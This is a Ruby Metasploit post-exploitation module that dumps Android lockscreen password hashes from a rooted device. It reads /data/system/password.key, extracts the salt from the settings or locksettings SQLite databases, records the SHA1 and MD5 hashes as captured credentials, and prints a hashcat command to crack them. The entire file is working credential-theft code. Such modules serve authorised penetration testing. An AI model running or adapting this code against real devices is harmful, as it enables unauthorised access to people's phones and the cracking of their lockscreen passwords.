##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'
require 'fileutils'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android Gather Dump Password Hashes for Android Systems",
        'Description'   => %q{
           Post Module to dump the password hashes for Android System. Root is required.
           To perform this operation, two things are needed.  First, a password.key file
           is required as this contains the hash but no salt.  Next, a sqlite3 database
           is needed (with supporting files) to pull the salt from.  Combined, this
           creates the hash we need.  This can be cracked with Hashcat, mode 5800.
           Samsung devices only have SHA1 hashes, while most other Android devices
           also have an MD5 hash.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['h00die'],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'      => 'android',
        'References'    => [
          ['URL', 'https://www.pentestpartners.com/security-blog/cracking-android-passwords-a-how-to/'],
          ['URL', 'https://hashcat.net/forum/thread-2202.html'],
        ],
      }
    ))
  end

  def run

    def read_store_sql(file_name, location)
      # we need the .db file, as well as the supporting files .db-shm and .db-wal as they may contain
      # the values we are looking for
      db_loot_name = ''
      ['', '-wal', '-shm'].each do |ext|
        l = location + ext
        f = file_name + ext
        data = read_file(l)
        if data.blank?
          print_error("Unable to read #{l}")
          return
        end
        print_good("Saved #{f} with length #{data.length}")

        if ext == ''
          loot_file = store_loot('SQLite3 DB', 'application/x-sqlite3', session, data, f, 'Android database')
          db_loot_name = loot_file
          next
        end

        loot_file = store_loot('SQLite3 DB', 'application/binary', session, data, f, 'Android database')

        # in order for sqlite3 to see the -wal and -shm support files, we have to rename them
        # we have to do this since the ext is > 3
        # https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/report.rb#L391
        new_name = "#{db_loot_name}#{ext}"
        FileUtils.mv(loot_file, new_name)
      end
      SQLite3::Database.new(db_loot_name)
    end

    unless is_root?
      fail_with Failure::NoAccess, 'This module requires root permissions.'
    end

    print_status('Attempting to determine unsalted hash.')
    key_file = '/data/system/password.key'
    unless file_exist?(key_file)
      print_error('No password.key file, no password on device.')
      return
    end

    hash = read_file(key_file)
    if hash.empty?
      print_error("Unable to read #{key_file}, and retrieve hash.")
      return
    end
    store_loot('Key', 'plain/text', session, hash, 'password.key', 'Android password hash key')
    print_good('Saved password.key')

    print_status('Attempting to determine salt')
    os = cmd_exec("getprop ro.build.version.release")
    vprint_status("OS Version: #{os}")
    if Gem::Version.new(os) < Gem::Version.new('4.3.0')
      # this is untested.
      begin
        vprint_status('Attempting to load < 4.3.0 Android settings file')
        db = read_store_sql('settings.db', '/data/data/com.android.providers.settings/databases/settings.db')
        if db.nil?
          print_error('Unable to load settings.db file.')
          return
        end
        salt = db.execute('SELECT lockscreen.password_salt from secure;')
      rescue SQLite3::SQLException
        print_error("Failed to pull salt from database.  Command output: #{salt}")
        return
      end
    else
      begin
        vprint_status('Attempting to load >= 4.3.0 Android settings file')
        db = read_store_sql('locksettings.db', '/data/system/locksettings.db')
        if db.nil?
          print_error('Unable to load locksettings.db file.')
          return
        end
        salt = db.execute("select value from locksettings where name='lockscreen.password_salt'")
      rescue SQLite3::SQLException
        print_error('Unable to retrieve salt value from database.')
        return
      end
    end

    salt = salt[0][0] # pull string from results Command output: [["5381737017539487883"]] may also be negative, therefore 20 char
    unless salt.to_s.length.between?(19,20)
      print_error("Unable to pull salt from database.  Command output: #{salt}")
      return
    end

    # convert from number string to hex and lowercase
    salt = salt.to_i.to_s(16)
    if salt.start_with?('-')
      salt[0] = '' # fastest way to remove first character
    end
    print_good("Password Salt: #{salt}")

    sha1 = hash[0...40]
    sha1 = "#{sha1}:#{salt}"
    print_good("SHA1: #{sha1}")
    print_good("Crack with: hashcat -m 5800 #{sha1}")
    credential_data = {
        jtr_format: identify_hash(sha1),
        origin_type: :session,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: sha1,
        session_id: session_db_id,
        username: '',
        workspace_id: myworkspace_id
    }
    create_credential(credential_data)

    if hash.length > 40 # devices other than Samsungs have sha1+md5 combined into a single string
      md5 = hash[40...72]
      md5 = "#{md5}:#{salt}"
      print_good("MD5: #{md5}")
      credential_data = {
          jtr_format: identify_hash(md5),
          origin_type: :session,
          post_reference_name: self.refname,
          private_type: :nonreplayable_hash,
          private_data: md5,
          session_id: session_db_id,
          username: '',
          workspace_id: myworkspace_id
      }
      create_credential(credential_data)
    end
  end
end
